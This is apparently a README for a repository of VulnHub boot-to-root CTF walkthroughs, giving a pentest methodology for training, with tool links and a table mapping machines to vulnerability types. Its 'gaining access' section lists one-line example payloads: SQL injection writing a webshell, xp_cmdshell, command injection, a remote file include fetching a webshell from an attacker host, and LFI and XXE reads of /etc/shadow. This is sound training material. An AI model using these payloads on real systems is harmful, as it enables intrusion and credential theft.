# Boot to root CTFs

Walkthroughs and notes of 'boot to root' CTFs mostly from VulnHub that I did for fun. I like to use vulnerable VMs from VulnHub (in addition to the ones I create) to organize hands-on penetration testing training sessions for junior security auditors/consultants :-)


## Classic pentest methodology to do a Boot2root CTF...

### Step 1 - Scanning and enumeration
```
   ➤ Network TCP/UDP port scans
   ➤ Service enumeration (HTTP,FTP,TFTP,SMB,NFS,SAMBA,SNMP,SMTP,..)
   ➤ User enumeration
   ➤ Vulnerability scans
   ➤ ...
```
*Useful tools: [Nmap](https://nmap.org/) (network port scanner and (NSE) scripts), [Burp proxy](https://portswigger.net/burp) (manual & automated Web security testing tool), [Nikto](https://www.kali.org/tools/nikto/) (Web vulnerability scanner), [Dirb](https://www.kali.org/tools/dirb/) & [Gobuster](https://github.com/OJ/gobuster)  (URL bruteforcers), [Kali various tools](https://www.kali.org/tools/), various scripts (source:Github/your owns).*


### Step 2 - Gaining access
```
1. Exploiting security misconfiguration
   ➤ Anonymous access (e.g. FTP/TFTP/NFS/SMB, unprotected web admin console)
   ➤ Default and weak credentials (e.g. Web server, CMS, database, OS)
   ➤ Web server misconfiguration (e.g. Webdav + HTTP PUT method allowed > upload a Webshell)
   ➤ Clear-text passwords stored in 'public' website pages, configuration files, log files
   ➤ ...
   
2. Exploiting unpatched known vulnerabilities 
   ➤ Web server            (e.g. Apache Struts RCE: CVE-2017-12611/CVE-2017-9805/CVE-2017-9791, JBoss Java Deserialization RCE)
   ➤ Bash & web server CGI (e.g. Shellshock RCE CVE-2014-6271/CVE-2014-7169)
   ➤ Web CMS               (e.g. Drupalgeddon2 RCE CVE-2018-7600)
   ➤ Web framework         (e.g. PHP CGI RCE CVE-2012-1823)
   ➤ FTP server            (e.g. ProFTPd 1.3.5 RCE CVE-2015-3306)
   ➤ Samba server          (e.g. SambaCry RCE CVE-2017-7494)
   ➤ Windows OS            (e.g. PrintNightmare/CVE-2021-1675, EternalBlue/MS17-010/CVE-2017-0143, MS14-068/CVE-2014-6324, MS08-067/CVE-2008-4250)
   ➤ ...
   
3. Exploiting Web application vulnerabilities
   ➤ SQLi - SQL injection                 (e.g. MysQL DB: SELECT webshell INTO DUMPFILE '/path/to/webshell.php'; MSSQL DB: exec master..xp_cmdshell 'windows command')
   ➤ Insecure upload function             (i.e. PHP/ASP/ASPX/JSP Webshell upload)
   ➤ OS command injection                 (e.g. https://target.com//stockStatus?ID=29|whoami)
   ➤ RFI - Remote File Include            (e.g. https://target.com/page?url=http://yourIP/webshell.php)
   ➤ LFI - Local File Include             (e.g. https://target.com/page?file=/../../../../etc/shadow)
   ➤ SSRF - Server Side Request Forgery   (e.g. https://target.com/page?url=http://127.0.0.1/phpmyadmin)
   ➤ XXE - XML external entity injection  (e.g. <!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/shadow" >]><foo>&xxe;</foo>]>)
   ➤ ...
```
*Useful tools: various scripts, webshells, and reverse shells (source:Github/your owns), [Kali various tools](https://www.kali.org/tools/), [ExploitDB](https://www.exploit-db.com) & [searchsploit](https://www.exploit-db.com/searchsploit) (public exploit database), [Burp proxy](https://portswigger.net/burp) (manual & automated Web security testing), [Sqlmap](https://github.com/sqlmapproject/sqlmap) (automatic SQL injection & DB takeover tool), [kadimus](https://github.com/P0cL4bs/kadimus) (LFI exploit tool), [Metasploit framework](https://www.metasploit.com/) (penetration testing framework), [Impacket framework](https://github.com/SecureAuthCorp/impacket) & [CrackMapExec](https://github.com/Porchetta-Industries/CrackMapExec) (Windows environment pentesting tools), [Hydra](https://www.kali.org/tools/hydra/) / [thc-hydra](https://github.com/vanhauser-thc/thc-hydra) / [ncrack](https://nmap.org/ncrack/) (password bruteforce tools),  [DBvis/DbVisualizer](https://www.dbvis.com/download/) (universal database tool).*

### Step 3 - Post-exploitation and Privilege escalation to become "root" or "Local System"
```
1. Exploiting security misconfiguration
   ➤ Windows OS (e.g. weak service permissions, weak file permissions, weak registry permissions, weak passwords, password reuse, clear-text passwords stored in scripts, unattended install files, AlwaysInstallElevated trick..)
   ➤ Linux OS   (e.g. SUDO misconfiguration, SUID misconfiguration, CRON misconfiguration, weak file permissions, weak passwords, password reuse, clear-text passwords in scripts and .bash_history..)
   
2. Exploiting unpatched known vulnerabilities 
   ➤ Linux local exploit   (e.g. DirtyPipe CVE-2022-0847, Dirtyc0w CVE-2016-5195, eBPF exploit CVE-2017-16995, Overlayfs exploit CVE-2015-1328)
   ➤ Windows local exploit (e.g. HOT/ROTTEN/JUICY POTATO exploits, MS16-032 Secondary Logon Handle Privesc)
   ➤ Exploit for any vulnerable service/software running with "Local System" or local administrator privilege
```
*Useful tools: various scripts such as [LinEnum](https://github.com/rebootuser/LinEnum) (Linux enumeration scripts), [LinPEAS & WinPEAS](https://github.com/carlospolop/PEASS-ng) (Linux & Windows enumeration scripts), [Linux Exploit suggester](https://github.com/mzet-/linux-exploit-suggester) / [Linux Exploit suggester 2](https://github.com/jondonas/linux-exploit-suggester-2) (scripts to assess Linux kernel security hardening and exposure on publicly known exploits), [PowerUp PowerShell script](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc) & [SharpUP](https://github.com/GhostPack/SharpUp) (Windows privilege escalation tools), [ExploitDB](https://www.exploit-db.com) & [searchsploit](https://www.exploit-db.com/searchsploit) (public exploit database), [Metasploit framework](https://www.metasploit.com/) (penetration testing framework), ...*

### Step 4 - Pivoting techniques to attack a second VM (or docker containers) only reachable from the 1rst one (some CTFs have several VMs/docker containers :-))
```
1. Pivoting with SSH tunneling (e.g. dynamic port forward / socks5 proxy / use of proxychain)
2. Pivoting with Metasploit/Meterpreter (e.g. post/multi/manage/autoroute + socks5 proxy + use of proxychain; "portfwd add" rules)
3. Pivoting with RPIVOT (reverse socks4 proxy, it works like ssh dynamic port forwarding but in the opposite direction)
4. Pivoting with TCP tunnelling over HTTP via Webshells (e.g. Tunna webshell, reGeorg client/webshell)
5. Pivoting with SOCAT / RDP / VNC...
6. ...
```

### Other - Mapping between a few boot2root VulnHub CTFs and common vulnerabilities/exploits

| Boot2root CTF | Anonymous access or Weak password | Insecure file upload function | Webshell | SQLi | LFI | RFI | XXE | OS cmd injection | XSS | Unpatched RCE flaw | Info / Note | 
| :---: | :---: | :---: | :---: | :---: | :---: | :---: | :---: | :---: | :---: | :---: | :---: |
| *Credit Card Scammers* | - | - | X | X | - | - | - | - | X | - | - |
| *Billu-b0x2* | - | - |- | - | - | - | - | - | - | X | Drupal CMS |
| *Bobby* | X | - | X | - | - | - | - | - | - | - | - |
| *CloudAV* | - | - | - | - | - | - | - | X | - | - | - |
| *DC:8* | - | - | X | X | - | - | - | - | - | - | Drupal CMS |
| *Vulnerable Docker:1* | X | - | X | - | - | - | - | - | - | - | WordPress CMS & Pivoting technique |
| *Freshly* | - | - | X | X | - | - | - | - | - | - | - |
| *Fristileaks.1.3* | - | X | X | - | - | - | - | - | - | - | - |
| *HackLab Vulnix* | X | - | - | - | - | - | - | - | - | - | - |
| *MinU:v2* | - | - | - | - | - | - | X | - | - | - |
| *Mr Robot* | X | - | X | - | - | - | - | - | - | - | WordPress CMS |
| *SafeHarbor:1* | - | - | - | X | X | X | - | - | - | X | Pivoting technique |
| *Scream* | X | - | X | - | - | - | - | - | - | X | - |
| *SickOS.1.1* | X | - | X | - | - | - | - | - | - | X | Pivoting technique |
| *SickOS.1.2* | - | - | X | - | - | - | - | - | - | - | - |
| *Stapler* | X | - | X | - | X | - | - | - | - | - | - |
| *Tr0ll1* | X | - | - | - | - | - | - | - | - | - | - |
| *Typhoon* | X | - | X | - | - | - | - | - | - | - | X | - | 
| *VulnOSv2* | - | - | - | X | - | - | - | - | - | X | Drupal CMS |
| *WinterMute* | X | - | X | - | X | - | - | - | - | X | Pivoting technique |
